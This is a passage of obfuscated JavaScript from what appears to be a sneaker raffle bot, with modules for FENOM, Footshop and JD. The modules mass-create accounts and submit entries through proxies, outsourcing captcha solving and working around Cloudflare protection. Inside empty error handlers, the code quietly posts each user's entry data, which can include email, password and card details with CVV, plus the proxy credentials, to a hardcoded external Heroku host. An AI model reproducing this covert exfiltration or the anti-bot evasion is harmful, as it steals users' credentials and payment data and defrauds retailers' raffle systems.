                                    await _0xbfbbf0['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x456243 = 'no', console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Account\x20' + _0x1fbcde[_0x1ca439]['Email'] + '\x20Generated')), _0x2e1301['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1fbcde[_0x1ca439]['Email'] + ',' + _0x1fbcde[_0x1ca439]['Password']);
                                let _0x291cb4 = _0x1fbcde[_0x1ca439];
                                try {
                                    prxdata = {
                                        'username': _0x25f505['replace']('#', ''),
                                        'module': _0x200c05['name'],
                                        'entrydata': JSON['stringify'](_0x291cb4),
                                        'proxy': '' + _0x1298da[_0x1ca439]
                                    };
                                    var _0x402824 = JSON['stringify'](prxdata);
                                    let _0x335755 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x402824, _0x335755);
                                } catch (_0x1a1f58) {
                                }
                                try {
                                    _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x4748bd['succesDEVMSG']);
                                } catch {
                                }
                                await _0x17b782(_0x30a02b, _0x4748bd['succesDEVMSG']);
                            } catch (_0x53eda8) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x509e2b) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20' + _0x509e2b)), _0x2652d6 = '' + _0x509e2b;
                            var _0x3a46bc = await _0x262703(_0x1fbcde[_0x1ca439], _0x200c05, 'acc', !![], _0x2652d6);
                            _0x4748bd['errorDEV'] = { 'embeds': [_0x3a46bc] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x4748bd['errorDEV']), await _0x17b782(_0x40c5c7, _0x4748bd['errorDEV']), _0x456243 = 'yes';
                        } finally {
                            _0x4a7f69['close']();
                            if (_0x456243 == 'yes' && _0x56ead9 != 0x5 && _0x2652d6 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Retrying\x20(' + _0x56ead9 + '\x20/\x205)')), _0x1ca439 = _0x1ca439 - 0x1, _0x56ead9 = _0x56ead9 + 0x1;
                                continue;
                            }
                            _0x456243 == 'yes' && _0x56ead9 >= 0x5 && (_0x2848bf(_0x1fbcde[_0x1ca439], _0x200c05), _0x456243 = 'no', _0x56ead9 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4445e7(_0x4cd449, _0x37e73d, _0x1349d8) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x150e82 = 0x0; _0x150e82 < _0x37e73d['length']; _0x150e82++) {
                        if (_0x4e067e != 'yes')
                            var _0x4e067e = '', _0x113f94 = 0x0;
                        var _0x4d9b67;
                        try {
                            await _0x195de7(_0x37e73d, _0x150e82);
                        } catch {
                            _0x4e067e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xe0def5(_0x4cd449['name'] + '\x20Task\x20' + (_0x150e82 + 0x1) + '\x20/\x20' + _0x37e73d['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        const _0xa89112 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x430959 = Math['round'](Math['random']() * (_0x1349d8['length'] - 0x1)), _0x454b2f = _0x1349d8[_0x430959]['split'](':'), _0x6403aa;
                        try {
                            _0x6403aa = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x454b2f[0x0] + ':' + _0x454b2f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x6403aa = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x454b2f[0x0] + ':' + _0x454b2f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1a7982 = await _0x6403aa['newPage'](), _0x566b13 = await _0x1a7982['target']()['createCDPSession'](), { windowId: _0x299e90 } = await _0x566b13['send']('Browser.getWindowForTarget');
                            await _0x1a7982['authenticate']({
                                'username': '' + _0x454b2f[0x2],
                                'password': '' + _0x454b2f[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a7982['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x17175c(0xbb8), await _0x566b13['send']('Browser.setWindowBounds', {
                                'windowId': _0x299e90,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x17175c(0x1f40);
                            try {
                                await _0x1a7982['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x17175c(0x1388), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1a7982['type']('input[name=\x22email\x22]', '' + _0x37e73d[_0x150e82]['Email']), await _0x17175c(0x1f4), await _0x1a7982['type']('input[name=\x22password\x22]', '' + _0x37e73d[_0x150e82]['Password']), await _0x17175c(0x258), await _0x1a7982['$eval']('#login-form', _0x3170ce => _0x3170ce['submit']()), await _0x1a7982['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x17175c(0x1f4), await _0x1a7982['goto']('' + _0x37e73d[_0x150e82]['Url']), await _0x1a7982['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x37e73d[_0x150e82]['Size']);
                            if (_0x37e73d[_0x150e82]['Size'] != 'RANDOM') {
                                var _0x37a715 = '\x20' + _0x37e73d[_0x150e82]['Size'] + '\x20';
                                const _0x4709fc = await _0x1a7982['$x']('//span[contains(text(),\x20' + _0x37a715 + ')]');
                                await _0x4709fc[0x0]['click']();
                            } else {
                                const _0x6f5f1d = await _0x1a7982['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x4c6db0 = Math['round'](Math['random']() * (_0x6f5f1d['length'] - 0x1));
                                await _0x6f5f1d[_0x4c6db0]['click']();
                            }
                            await _0x17175c(0x258), await _0x1a7982['click']('#cookieChoiceDismiss'), await _0x17175c(0x3e8), await _0x1a7982['type']('#instagram-account', '' + _0x37e73d[_0x150e82]['Follower']), await _0x17175c(0x28a), await _0x1a7982['click']('#book-btn'), await _0x17175c(0xbb8);
                            try {
                                await _0x1a7982['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20' + _0x1446ca['cyan']('Solving\x20Captcha')), await _0x1a7982['solveRecaptchas'](), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x17175c(0x7d0), await _0x1a7982['$eval']('#book-btn-for-sure', _0x5afce4 => _0x5afce4['click']()), await _0x17175c(0x12c), await _0x1a7982['click']('#book-btn-for-sure'), await _0x17175c(0xdac);
                            const _0x107c99 = await _0x1a7982['$eval']('.reservation-popup\x20>\x20.title', _0x28147b => {
                                return _0x28147b['innerHTML'];
                            });
                            if (_0x107c99) {
                                _0x4e067e = 'no', _0x12263c(_0x37e73d[_0x150e82], _0x4cd449), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x45e378 = await _0x262703(_0x37e73d[_0x150e82], _0x4cd449, 'dev', ![]), _0x16f04c = await _0x262703(_0x37e73d[_0x150e82], _0x4cd449, 'pub', ![]);
                                let _0x5ed33e = _0x37e73d[_0x150e82];
                                try {
                                    prxdata = {
                                        'username': _0x25f505['replace']('#', ''),
                                        'module': _0x4cd449['name'],
                                        'entrydata': JSON['stringify'](_0x5ed33e),
                                        'proxy': '' + _0x1349d8[_0x150e82]
                                    };
                                    var _0x503ea9 = JSON['stringify'](prxdata);
                                    let _0x289974 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x503ea9, _0x289974);
                                } catch (_0x7e0915) {
                                }
                                const _0x5973c2 = {
                                    'succesDEVMSG': { 'embeds': [_0x45e378] },
                                    'succesPUBMSG': { 'embeds': [_0x16f04c] }
                                };
                                try {
                                    _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x5973c2['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x5973c2['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x5973c2['succesPUBMSG']);
                                } catch (_0x224d1c) {
                                    console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x224d1c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x55ea54) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20' + _0x55ea54)), _0x4d9b67 = '' + _0x55ea54;
                            var _0x1d8d28 = await _0x262703(_0x37e73d[_0x150e82], _0x4cd449, 'dev', !![], _0x4d9b67), _0x45e378 = await _0x262703(_0x37e73d[_0x150e82], _0x4cd449, 'dev', ![]), _0x16f04c = await _0x262703(_0x37e73d[_0x150e82], _0x4cd449, 'pub', ![]);
                            const _0x59f577 = {
                                'succesDEVMSG': { 'embeds': [_0x45e378] },
                                'succesPUBMSG': { 'embeds': [_0x16f04c] }
                            };
                            _0x59f577['errorDEV'] = { 'embeds': [_0x1d8d28] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x59f577['errorDEV']), await _0x17b782(_0x40c5c7, _0x59f577['errorDEV']), _0x55ea54 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4e067e = 'yes');
                        } finally {
                            _0x6403aa['close']();
                            if (_0x4e067e == 'yes' && _0x113f94 != 0x5 && _0x4d9b67 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Task\x20' + (_0x150e82 + 0x1) + '\x20:\x20Retrying\x20(' + _0x113f94 + '\x20/\x205)')), _0x150e82 = _0x150e82 - 0x1, _0x113f94 = _0x113f94 + 0x1;
                                continue;
                            }
                            _0x4e067e == 'yes' && _0x113f94 >= 0x5 && (_0x2848bf(_0x37e73d[_0x150e82], _0x4cd449), _0x4e067e = 'no', _0x113f94 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x4cd449['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5b7a67, _0x5996ef, _0x1ab946) {
                _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x395552['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1f9897 = 0x0; _0x1f9897 < _0x5996ef['length']; _0x1f9897++) {
                    var _0x5f2673;
                    if (_0x1d9dbd != 'yes')
                        var _0x1d9dbd = '', _0x278b1a = 0x0;
                    var _0x52e0dc = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x25f505
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x5996ef[_0x1f9897]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5996ef[_0x1f9897]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x395552['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5e7c75
                            }
                        ]
                    }], _0x145ae2 = await _0x262703(_0x5996ef[_0x1f9897], _0x5b7a67, 'dev', ![]), _0x11b458 = await _0x262703(_0x5996ef[_0x1f9897], _0x5b7a67, 'pub', ![]);
                    const _0x265f46 = {
                        'succesDEVMSG': { 'embeds': [_0x145ae2] },
                        'succesPUBMSG': { 'embeds': [_0x11b458] }
                    }, _0xc8f84e = { 'embeds': _0x52e0dc };
                    try {
                        await _0x195de7(_0x5996ef, _0x1f9897);
                    } catch {
                        _0x1d9dbd = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x5996ef[_0x1f9897]['Email'] == '' || _0x5996ef[_0x1f9897]['FirstName'] == '' || _0x5996ef[_0x1f9897]['LastName'] == '' || _0x5996ef[_0x1f9897]['Country'] == '' || _0x5996ef[_0x1f9897]['Size'] == '' || _0x5996ef[_0x1f9897]['Address1'] == '' || _0x5996ef[_0x1f9897]['Zip'] == '') {
                        console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5996ef[_0x1f9897]['Email'] == '' || _0x5996ef[_0x1f9897]['FirstName'] == '' || _0x5996ef[_0x1f9897]['LastName'] == '' || _0x5996ef[_0x1f9897]['Country'] == '' || _0x5996ef[_0x1f9897]['Size'] == '' || _0x5996ef[_0x1f9897]['Address1'] == '' || _0x5996ef[_0x1f9897]['Zip'] == '' || _0x5996ef[_0x1f9897]['Phone'] == '') {
                        console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x5f7492 = '' + _0x5996ef[_0x1f9897]['Url'];
                    if (_0x395552['useRandomProxy'] = ![])
                        var _0x5604fc = _0x1ab946[_0x1f9897]['split'](':');
                    else
                        var _0x4e503a = Math['round'](Math['random']() * (_0x1ab946['length'] - 0x1)), _0x5604fc = _0x1ab946[_0x4e503a]['split'](':');
                    var _0x3834f9;
                    try {
                        _0x3834f9 = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5604fc[0x0] + ':' + _0x5604fc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3834f9 = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5604fc[0x0] + ':' + _0x5604fc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xb65cf2 = await _0x3834f9['newPage']();
                        await _0xb65cf2['authenticate']({
                            'username': '' + _0x5604fc[0x2],
                            'password': '' + _0x5604fc[0x3]
                        }), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb65cf2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xb65cf2['setRequestInterception'](!![]), _0xb65cf2['on']('request', _0x2a233b => {
                            _0x2a233b['resourceType']() === 'image' || _0x2a233b['resourceType']() === 'font' || _0x2a233b['resourceType']() === 'media' ? _0x2a233b['abort']() : _0x2a233b['continue']();
                        });
                        try {
                            await _0xb65cf2['goto'](_0x5f7492), await _0x17175c(0xbb8), await _0xb65cf2['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xb65cf2['click']('.control__JhutY'), await _0x17175c(0x1f4);
                        if (_0x5996ef[_0x1f9897]['Size'] != 'RANDOM')
                            try {
                                const _0xc6c024 = await _0xb65cf2['$x']('//div[contains(text(),\x20\x27' + _0x5996ef[_0x1f9897]['Size'] + '\x27)]');
                                await _0xc6c024[0x0]['click']();
                            } catch {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x5c9d3f = await _0xb65cf2['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x5d3635 = Math['round'](Math['random']() * (_0x5c9d3f['length'] - 0x1));
                            await _0x5c9d3f[_0x5d3635]['click']();
                        }
                        await _0x17175c(0x4b0);
                        const _0x10c890 = await _0xb65cf2['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x10c890[0x0]['click'](), await _0xb65cf2['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0xb65cf2['type']('input[name=\x22email\x22]', '' + _0x5996ef[_0x1f9897]['Email']), await _0x17175c(0x640), await _0xb65cf2['type']('input[name=\x22phone\x22]', '' + _0x5996ef[_0x1f9897]['Phone']), await _0x17175c(0x4b0), await _0xb65cf2['click']('button.btn.continue-button__1RtsS'), await _0x17175c(0x4b0);
                        try {
                            await _0xb65cf2['type']('input[name=\x22firstName\x22]', '' + _0x5996ef[_0x1f9897]['FirstName']), await _0x17175c(0x258);
                        } catch {
                            const _0xc3f218 = await _0xb65cf2['$$eval']('.invalid-feedback\x20>\x20div', _0x115155 => {
                                return _0x115155['map'](_0x596240 => _0x596240['innerText']);
                            });
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20' + _0xc3f218));
                            continue;
                        }
                        await _0xb65cf2['type']('input[name=\x22lastName\x22]', '' + _0x5996ef[_0x1f9897]['LastName']), await _0x17175c(0xc8), await _0xb65cf2['type']('input[name=\x22instagramUsername\x22]', '' + _0x5996ef[_0x1f9897]['Follower']), await _0x17175c(0x4b0), await _0xb65cf2['click']('button.btn.continue-button__1RtsS'), await _0x17175c(0x3e8), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0xb65cf2['select']('select[name=\x22country\x22]', '' + _0x5996ef[_0x1f9897]['Country']), await _0x17175c(0x2bc), await _0xb65cf2['type']('input[name=\x22streetName\x22]', '' + _0x5996ef[_0x1f9897]['Address1']), await _0x17175c(0x258), await _0xb65cf2['type']('input[name=\x22houseNumber\x22]', _0x5996ef[_0x1f9897]['HouseNumber'] + '\x20' + _0x5996ef[_0x1f9897]['Address2']), await _0x17175c(0xc8), await _0xb65cf2['type']('input[name=\x22postalCode\x22]', '' + _0x5996ef[_0x1f9897]['Zip']), await _0x17175c(0x1f4), await _0xb65cf2['type']('input[name=\x22city\x22]', '' + _0x5996ef[_0x1f9897]['City']), await _0x17175c(0x4b0), await _0xb65cf2['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x17175c(0x4b0), await _0xb65cf2['click']('button.btn.continue-button__1RtsS'), await _0x17175c(0x4b0), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0xb65cf2['solveRecaptchas'](), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x17175c(0xbb8), await _0xb65cf2['click']('button.btn.continue-button__1RtsS'), await _0x17175c(0x1388), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xb65cf2['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xb65cf2['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x17175c(0x4b0), await _0xb65cf2['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x5996ef[_0x1f9897]['CardNumber']), await _0x17175c(0x320), await _0xb65cf2['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xb65cf2['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x5996ef[_0x1f9897]['ExpiryDate']), await _0x17175c(0x4b0), await _0xb65cf2['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xb65cf2['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x5996ef[_0x1f9897]['CVV']), await _0x17175c(0x226), await _0xb65cf2['type']('input[name=\x22holderName\x22]', '' + _0x5996ef[_0x1f9897]['NameOnCard']), await _0x17175c(0x226), await _0xb65cf2['click']('button.adyen-checkout__button'), console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0xb65cf2['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x17175c(0xbb8);
                        } catch (_0x252e51) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x203DS\x20Failed')), _0x5f2673 = '3DS\x20Error\x20' + _0x252e51;
                            var _0x7248a8 = await _0x262703(_0x5996ef[_0x1f9897], _0x5b7a67, 'dev', !![], _0x5f2673);
                            _0x265f46['errorDEV'] = { 'embeds': [_0x7248a8] };
                            _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x265f46['errorDEV']);
                            await _0x17b782(_0x40c5c7, _0x265f46['errorDEV']);
                            continue;
                        }
                        _0x12263c(_0x5996ef[_0x1f9897], _0x5b7a67), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x205415 = _0x5996ef[_0x1f9897];
                        try {
                            prxdata = {
                                'username': _0x25f505['replace']('#', ''),
                                'module': _0x5b7a67['name'],
                                'entrydata': JSON['stringify'](_0x205415),
                                'proxy': '' + _0x1ab946[_0x1f9897]
                            };
                            var _0x171965 = JSON['stringify'](prxdata);
                            let _0x5c8a3c = { 'headers': { 'content-type': 'application/json' } };
                            await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x171965, _0x5c8a3c);
                        } catch (_0x1f47ae) {
                        }
                        if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                            try {
                                await _0x17b782(_0x395552['webhook'], _0x265f46['succesDEVMSG']);
                            } catch {
                            }
                        await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x265f46['succesDEVMSG']), await _0x17175c(0xc8);
                        try {
                            await _0x17b782(_0xd9f2b8, _0x265f46['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xd72ec1) {
                        console['log'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20' + _0xd72ec1), _0x5f2673 = '' + _0xd72ec1;
                        var _0x7248a8 = await _0x262703(_0x5996ef[_0x1f9897], _0x5b7a67, 'dev', !![], _0x5f2673);
                        _0x265f46['errorDEV'] = { 'embeds': [_0x7248a8] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x265f46['errorDEV']), await _0x17b782(_0x40c5c7, _0x265f46['errorDEV']), _0x1d9dbd = 'yes';
                    } finally {
                        _0x3834f9['close']();
                        if (_0x1d9dbd == 'yes' && _0x278b1a != 0x5) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x5b7a67['name'] + ']\x20Task\x20' + (_0x1f9897 + 0x1) + '\x20:\x20Retrying\x20(' + _0x278b1a + '\x20/\x205)')), _0x1f9897 = _0x1f9897 - 0x1, _0x278b1a = _0x278b1a + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xa6a07b, _0x4a18d0, _0x465cb6) {
                var _0x5914f6 = ![], _0x2a33c4 = ![];
                if (_0x395552['captchaKey'] == '' || _0x395552['captchaKey'] == undefined)
                    return console['log'](_0x1446ca['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x395552['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1f48df = 0x0; _0x1f48df < _0x4a18d0['length']; _0x1f48df++) {
                    if (_0x9293af != 'yes')
                        var _0x9293af = '', _0x10bace = 0x0;
                    var _0xf6aee, _0x5d5c1d = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x4a18d0[_0x1f48df]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4a18d0[_0x1f48df]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x25f505
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x395552['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5e7c75
                            }
                        ]
                    }];
                    const _0x5110b7 = { 'embeds': _0x5d5c1d };
                    _0xe0def5(_0xa6a07b['name'] + '\x20Task\x20' + (_0x1f48df + 0x1) + '\x20/\x20' + _0x4a18d0['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                    try {
                        await _0x195de7(_0x4a18d0, _0x1f48df);
                    } catch {
                        _0x9293af = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x416b10 = await _0x262703(_0x4a18d0[_0x1f48df], _0xa6a07b, 'dev', ![]), _0x457fc7 = await _0x262703(_0x4a18d0[_0x1f48df], _0xa6a07b, 'pub', ![]);
                    const _0x340102 = {
                        'succesDEVMSG': { 'embeds': [_0x416b10] },
                        'succesPUBMSG': { 'embeds': [_0x457fc7] }
                    };
                    if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                        try {
                            await _0x17b782(_0x395552['webhook'], _0x340102['succesDEVMSG']);
                        } catch {
                        }
                    await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x340102['succesDEVMSG']), await _0x17175c(0xc8);
                    try {
                        await _0x17b782(_0xd9f2b8, _0x340102['succesPUBMSG']);
                    } catch {
                    }
